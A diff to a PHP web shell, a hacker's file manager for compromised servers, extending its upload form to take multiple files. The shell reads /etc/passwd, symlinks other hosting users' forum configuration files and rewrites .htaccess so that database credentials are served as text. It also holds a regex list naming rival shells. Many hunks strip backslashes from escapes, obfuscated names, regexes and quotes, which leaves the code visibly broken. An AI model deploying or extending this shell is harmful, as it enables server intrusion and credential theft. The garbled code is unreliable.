@@ -380,12 +380,12 @@ function filedate($file) {
     return date("F d Y g:i:s", filemtime($file));
 }
 function fext($file) {
-    $sub = "\163\x75" . "\142\x73" . "\x74\x72";
+    $sub = "163x75" . "142x73" . "x74x72";
     return $sub(strrchr($file,'.'),1);
 } function gazz($file) {
     $fbiasa = array("php","phtml","shtml","phar","php7","html","htm","inc","phps","txt","js","css","htaccess","bin","pl","py","sh","php58","PhP7","aspx","dll","ini");
     $notf = array("jpeg","jpg","png","gif","ico","webp","mp3","m4A","flac","wav","wma","3gp","ogg","webm","mp4","exe");
-    $stl = "\x73\x74" . "\162\164" . "\157\154\x6f" . "\167\x65\162";
+    $stl = "x73x74" . "162164" . "157154x6f" . "167x65162";
     $ext=$stl(fext($file));
     if ($file == 'error_log') {
         return "
@@ -454,7 +454,7 @@ function unzip($file, $serlok) {
     if (!is_readable($file)) {
         red("<table class='directory-listing-table' style='color:orange;'><thead><td><font color='orange'>Cannot Unzip File / Unreadable File !</font></td></thead></table>");
         die();
-    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
+    } elseif (strpos(file_get_contents($file), "x50x4bx03x04") === false) {
         echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> This isn't Zip File</center></font></td></table>";
         die();
     }
@@ -482,7 +482,7 @@ if(isset($_GET['path'])){
     $serlok2 = getcwd();
 }
 
-$serlok = str_replace('\\','/',$serlok);
+$serlok = str_replace('','/',$serlok);
 $serloks = explode('/',$serlok);
 $serlokbos = @scandir($serlok);
 
@@ -707,33 +707,44 @@ if (isset($_GET['viewfile'])) {
 
 } elseif ($_REQUEST[net('upload')] == "opet") {
     echo "<table class='directory-listing-table'><td><center>
-    <form method='POST' enctype='multipart/form-data' id='upload'><h5><i class='fa fa-upload'></i> UPLOAD FILES<h5>
+    <form method='POST' enctype='multipart/form-data' id='upload'><h5><i class='fa fa-upload'></i> UPLOAD FILES</h5>
     <div class='input-group' style='width:360px;'>
-    <input type='file' name='d7netfile' id='d7net' style='background-color: grey;' class='form-control' name='uplod'>
+    <input type='file' name='d7netfile[]' id='d7net' style='background-color: grey;' class='form-control' multiple>
     <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>
-              </form></center></td></table>";
-     if (isset($_POST['uplod'])) {
+    </form></center></td></table>";
+    
+    if (isset($_POST['uplod'])) {
         if ($_POST['dirnya'] == "2") {
             $serlok = $_SERVER['DOCUMENT_ROOT'];
         }
-        if (empty($_FILES['d7netfile']['name'])) {
-            echo "<br><table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> File not selected</center></font>";
+        if (empty($_FILES['d7netfile']['name'][0])) {
+            echo "<br><table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> File not selected</center></font></td></table>";
         } else {
-            $data = @file_put_contents($serlok."/".$_FILES['d7netfile']['name'], @file_get_contents($_FILES['d7netfile']['tmp_name']));
-                if (file_exists($serlok."/".$_FILES['d7netfile']['name'])) {
-                    $fl = $serlok."/".$_FILES['d7netfile']['name'];
+            // Hitung jumlah file yang diunggah
+            $fileCount = count($_FILES['d7netfile']['name']);
+            for ($i = 0; $i < $fileCount; $i++) {
+                // Nama file dan lokasi sementara
+                $fileName = $_FILES['d7netfile']['name'][$i];
+                $tmpFile = $_FILES['d7netfile']['tmp_name'][$i];
+
+                // Simpan file ke server
+                $data = @file_put_contents($serlok . "/" . $fileName, @file_get_contents($tmpFile));
+                if (file_exists($serlok . "/" . $fileName)) {
+                    $fl = $serlok . "/" . $fileName;
                     echo "<br><table class='directory-listing-table' style='border-color:lime;'><td>
-                    Uploaded => <font color='lime'><i>".$_FILES['d7netfile']['name']."</i></font><br>";
+                    Uploaded => <font color='lime'><i>" . $fileName . "</i></font><br>";
+                    
                     if (strpos($serlok, $_SERVER['DOCUMENT_ROOT']) !== false) {
-                        $lwb = str_replace($_SERVER['DOCUMENT_ROOT'], $web."/", $fl);
-                        echo "Link : <a href='".$lwb."' target='_blank'><font color='lime'>Click here</font></a></td></table><br>";
+                        $lwb = str_replace($_SERVER['DOCUMENT_ROOT'], $web . "/", $fl);
+                        echo "Link : <a href='" . $lwb . "' target='_blank'><font color='lime'>Click here</font></a></td></table><br>";
                     }
-                    echo "<br>";
                 } else {
-                    echo "<br><table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center>There was an error uploading your file.</font></td></table>";
+                    echo "<br><table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center>There was an error uploading your file.</center></font></td></table>";
+                }
             }
         }
-    }exit(); 
+    }
+    exit();
 
  } elseif ($_GET[net('tool')] == "opet") {
 echo '<table class="directory-listing-table"><thead><td><center><font color=orange>Select Tools</font><hr>
@@ -842,9 +853,9 @@ $algorithms = [
 '<font color="lime">SHA224, Keccak-224' => '/^[a-f0-9]{56}$/i',
 '<font color="lime">SHA256' => '/^[a-f0-9]{64}$/i',
 '<font color="lime">SHA512' => '/^[a-f0-9]{128}$/i',
-'<font color="lime">Bcrypt, Blowfish(Unix)' => '/^\$2y\$[0-9]{2}\$[A-Za-z0-9\.\/]{53}$/',
-'<font color="lime">Argon2i' => '/^\$argon2i\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9\/+]{43,}\$[A-Za-z0-9\/+]{43,}$/',
-'<font color="lime">Argon2id' => '/^\$argon2id\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9\/+]{43,}\$[A-Za-z0-9\/+]{43,}$/'];
+'<font color="lime">Bcrypt, Blowfish(Unix)' => '/^$2y$[0-9]{2}$[A-Za-z0-9./]{53}$/',
+'<font color="lime">Argon2i' => '/^$argon2i$v=d+$m=d+,t=d+,p=d+$[A-Za-z0-9/+]{43,}$[A-Za-z0-9/+]{43,}$/',
+'<font color="lime">Argon2id' => '/^$argon2id$v=d+$m=d+,t=d+,p=d+$[A-Za-z0-9/+]{43,}$[A-Za-z0-9/+]{43,}$/'];
     foreach ($algorithms as $name => $pattern) {
         if (preg_match($pattern, $hash)) {
             return $name;
@@ -856,8 +867,8 @@ $hashes = [$_POST['hash']];
 echo "<table class='directory-listing-table'><td>";
 foreach ($hashes as $hash) {
     echo "
-    Hash : <font color='lime'>$hash\n</font>";
-    echo "<br> Algorithms : " .identify($hash). "\n\n</font></td></table>";
+    Hash : <font color='lime'>$hashn</font>";
+    echo "<br> Algorithms : " .identify($hash). "nn</font></td></table>";
             }
         }
     } exit();
@@ -869,7 +880,7 @@ echo '<table class="directory-listing-table"><thead><td>
 <center>Config Grabber<br><br><form method="POST"><textarea cols="100" name="passwd"  rows="25">'; 
 $uSr=file("/etc/passwd"); 
 foreach($uSr as $usrr) { 
-$str=explode(":",$usrr); echo $str[0]."\n"; } 
+$str=explode(":",$usrr); echo $str[0]."n"; } 
 echo'</textarea><br>
 <input type="hidden" class="input" name="folfig" value="d7netcfg"/><br>
 <select class="form-select form-select-sm" aria-label=".form-select-lg example" style="width:150px;">
@@ -888,16 +899,16 @@ $folfig = $_POST['folfig']; $type = $_POST['type'];
 @chdir($folfig);
 $htaccess="
 Options Indexes FollowSymLinks
-\nDirectoryIndex .my.cnf
-\nAddType txt .php
-\nAddType txt .my.cnf
-\nAddType txt .accesshash
-\nAddHandler txt .php
-\nAddHandler txt .cnf
-\nAddHandler txt .accesshash
+nDirectoryIndex .my.cnf
+nAddType txt .php
+nAddType txt .my.cnf
+nAddType txt .accesshash
+nAddHandler txt .php
+nAddHandler txt .cnf
+nAddHandler txt .accesshash
 ";
 file_put_contents(".htaccess",$htaccess,FILE_APPEND);
-$passwd=explode("\n",$_POST["passwd"]);
+$passwd=explode("n",$_POST["passwd"]);
 foreach($passwd as $pwd){ $user=trim($pwd);
 @symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vBulletin1.txt');
 @symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-vBulletin3.txt');
@@ -962,8 +973,8 @@ echo '<table class="directory-listing-table"><thead><td><center>Done => <a href=
     foreach (new RecursiveIteratorIterator($rdi) as $filename => $file) {
         if (pathinfo($filename, PATHINFO_EXTENSION) == $ext) {
             $content = file_get_contents($filename);
-            if (preg_match('/(eval|base64_decode|str_rot13|mass_deface|addrdp|@exec|@passthru|@chmod|#exec|deface|command|{IFS}|shell_exec|SERVER_SOFTWARE|wget|@get_current_user|@getmygid|htmlspecialchars_decode|B374k|@getmygid|hacked|exe_root|xploit|Disable_Function|backdoor|backconnect|gecko-select|php_uname|Alfa-Team|ALFA_DATA|MARIJUANA|blackeagleteam|IndoSec|getHostByName|alfashell|php-obfuscator|gacor|slot-gacor|slot88|featureShell|move_upload_file|upload)\s*\(/i', $content)) {
-                echo "<pre>Found : <font color='lime'>$filename</font> => <font color='orange'>Detected</font> <a href='?viewfile=$filename&path=".$_GET['path']."/$rdi' target='_blank'><i>view</i></a></pre>\n";
+            if (preg_match('/(eval|base64_decode|str_rot13|mass_deface|addrdp|@exec|@passthru|@chmod|#exec|deface|command|{IFS}|shell_exec|SERVER_SOFTWARE|wget|@get_current_user|@getmygid|htmlspecialchars_decode|B374k|@getmygid|hacked|exe_root|xploit|Disable_Function|backdoor|backconnect|gecko-select|php_uname|Alfa-Team|ALFA_DATA|MARIJUANA|blackeagleteam|IndoSec|getHostByName|alfashell|php-obfuscator|gacor|slot-gacor|slot88|featureShell|move_upload_file|upload)s*(/i', $content)) {
+                echo "<pre>Found : <font color='lime'>$filename</font> => <font color='orange'>Detected</font> <a href='?viewfile=$filename&path=".$_GET['path']."/$rdi' target='_blank'><i>view</i></a></pre>n";
             }
         }
     } 
@@ -1208,7 +1219,7 @@ echo '<table class="table table-dark table-hover" style="box-shadow: 0 0 20px bl
 <th><center>Permissions</center></th>
 <th><center>Actions</center></th>
 </tr></thead><center>';
-$scd = "\163\143"."\141\156\144"."\151\162";
+$scd = "163143"."141156144"."151162";
 if(is_readable($serlok)){
             $fetch=$scd($serlok);
             $serlokbos=array();
@@ -1227,7 +1238,7 @@ if(is_readable($serlok)){
             }
 foreach($serlokbos as $dir){
     echo "<tr>
-    <td><i class='fa fa-folder' style='color: #FAA625'></i> <a href=\"?path=".$serlok."/".$dir."\">".$dir."</a></td>
+    echo "<td><i class='fa fa-folder' style='color: #FAA625'></i> <a href='?path=" . $serlok . "/" . $dir . "'>" . $dir . "</a></td>";
     <td><center>Dir</center></td>
     <td><center>".filedate($serlok."/".$dir)."</center></td>
     <td>".owner($serlok."/".$dir)."</td>
@@ -1238,16 +1249,16 @@ foreach($serlokbos as $dir){
     if(is_writable($serlok."/".$dir) || !is_readable($serlok."/".$dir)) echo '</font>';
 
     echo "</center></td>
-    <td><center><form method=\"POST\" action=\"?pilihan&path=$serlok\">
+    <td><center><form method="POST" action="?pilihan&path=$serlok">
     <div class='btn-group me-2' role='group' aria-label='First group'>
     <button type='submit' class='btn btn-outline-secondary badge-action-rename' name='pilih' value='gantinama'>
     <i class='fa fa-pencil' style='color: #fff'></i></button>
     <button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmodf'><i class='fa fa-gear' style='color: #06D2D5'></i></button>
     <button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdatef'><i class='fa fa-calendar' style='color: #5654F5'></i></button>
     <button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #E53A3A'></i></button></div>
-    <input type=\"hidden\" name=\"type\" value=\"dir\">
-    <input type=\"hidden\" name=\"name\" value=\"$dir\">
-    <input type=\"hidden\" name=\"path\" value=\"$serlok/$dir\">
+    <input type="hidden" name="type" value="dir">
+    <input type="hidden" name="name" value="$dir">
+    <input type="hidden" name="path" value="$serlok/$dir">
     </form></center></td>
     </tr>";
 }
@@ -1263,7 +1274,7 @@ foreach($filez as $file) {
     }
 echo "<tr>
 <td>".cekfile($serlok."/".$file)."
-<a href=\"?viewfile=".$serlok."/$file&path=".$serlok."\">$file</a></td>
+<a href="?viewfile=".$serlok."/$file&path=".$serlok."">$file</a></td>
 <td><center>".$size."</center></td>
 <td><center>".filedate($serlok."/".$file)."</center></td>
 <td>".owner($serlok."/".$file)."</td>
@@ -1276,9 +1287,9 @@ echo "</center></td><td><center>
 <form method='post' action='?pilihan&path=$serlok'>
 <div class='btn-group' role='group' aria-label='First group'>";
 echo gazz($file);
-echo "</div><input type=\"hidden\" name=\"type\" value=\"file\">
-<input type=\"hidden\" name=\"name\" value=\"$file\">
-<input type=\"hidden\" name=\"path\" value=\"$serlok/$file\">
+echo "</div><input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="$file">
+<input type="hidden" name="path" value="$serlok/$file">
 </form></center></td></tr>";
 }
 echo '</tr></td></table></table>';
